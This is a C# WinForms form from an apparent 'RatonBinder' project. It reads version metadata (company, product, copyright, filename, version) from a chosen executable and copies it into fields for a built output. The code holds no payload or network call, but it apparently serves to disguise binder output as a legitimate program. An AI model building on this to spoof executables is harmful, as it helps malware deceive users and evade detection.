using DarkModeForms;
using Mono.Cecil;
using Raton.Classes;
using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace RatonBinder
{
    public partial class Form2 : Form
    {
        public string AsmDescription => assemblydescrip.Text;
        public string AsmProduct => assemblyproduct.Text;
        public string AsmCompany => assemblycompany.Text;
        public string AsmOriginalFilename => assemblyfilename.Text;
        public string AsmCopyright => assemblycopyright.Text;
        public string AsmVersion => assemblyversion.Text;

        public Form2()
        {
            InitializeComponent();
            DarkMode.Start(this);
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            SetControls(false);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(assemblyfilename.Text))
            {
                Messenger.MessageBox("Please insert at least an original filename.", "Assembly",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (!string.IsNullOrWhiteSpace(assemblyversion.Text))
            {
                if (!Regex.IsMatch(assemblyversion.Text.Trim(), @"^\d+\.\d+\.\d+\.\d+$"))
                {
                    Messenger.MessageBox("Version must be in format: x.x.x.x", "Assembly",
                        MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
            }

            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                openFileDialog.Title = "Clone assembly";

                if (openFileDialog.ShowDialog() != DialogResult.OK)
                    return;

                string exePath = openFileDialog.FileName;

                try
                {
                    var assembly = AssemblyDefinition.ReadAssembly(exePath);
                    var module = assembly.MainModule;

                    string title = "";
                    string product = "";
                    string company = "";
                    string description = "";
                    string copyright = "";
                    string version = assembly.Name.Version.ToString();

                    foreach (var attr in module.Assembly.CustomAttributes)
                    {
                        string attrName = attr.AttributeType.FullName;
                        string value = attr.ConstructorArguments.Count > 0
                            ? attr.ConstructorArguments[0].Value?.ToString()
                            : "";

                        if (attrName == "System.Reflection.AssemblyTitleAttribute") title = value;
                        if (attrName == "System.Reflection.AssemblyProductAttribute") product = value;
                        if (attrName == "System.Reflection.AssemblyCompanyAttribute") company = value;
                        if (attrName == "System.Reflection.AssemblyDescriptionAttribute") description = value;
                        if (attrName == "System.Reflection.AssemblyCopyrightAttribute") copyright = value;
                    }

                    assemblydescrip.Text = description;
                    assemblyproduct.Text = product;
                    assemblycompany.Text = company;
                    assemblyfilename.Text = Path.GetFileName(exePath);
                    assemblycopyright.Text = copyright;
                    assemblyversion.Text = version;

                    Messenger.MessageBox("Assembly loaded successfully (.NET)", "Assembly",
                        MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch
                {
                    try
                    {
                        FileVersionInfo fileInfo = FileVersionInfo.GetVersionInfo(exePath);

                        assemblydescrip.Text = fileInfo.FileDescription ?? "";
                        assemblyproduct.Text = fileInfo.ProductName ?? "";
                        assemblycompany.Text = fileInfo.CompanyName ?? "";
                        assemblyfilename.Text = Path.GetFileName(exePath);
                        assemblycopyright.Text = fileInfo.LegalCopyright ?? "";
                        assemblyversion.Text = fileInfo.FileVersion ?? "";

                        Messenger.MessageBox("Assembly loaded successfully (native)", "Assembly",
                            MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception ex)
                    {
                        Messenger.MessageBox(ex.Message, "Error",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        private void customSwitch1_CheckedChanged(object sender, EventArgs e)
        {
            SetControls(customSwitch1.Checked);
        }

        private void SetControls(bool enabled)
        {
            assemblyproduct.Enabled = enabled;
            assemblydescrip.Enabled = enabled;
            assemblycompany.Enabled = enabled;
            assemblycopyright.Enabled = enabled;
            assemblyfilename.Enabled = enabled;
            assemblyversion.Enabled = enabled;
            button2.Enabled = enabled;
            button1.Enabled = enabled;
        }
    }
}
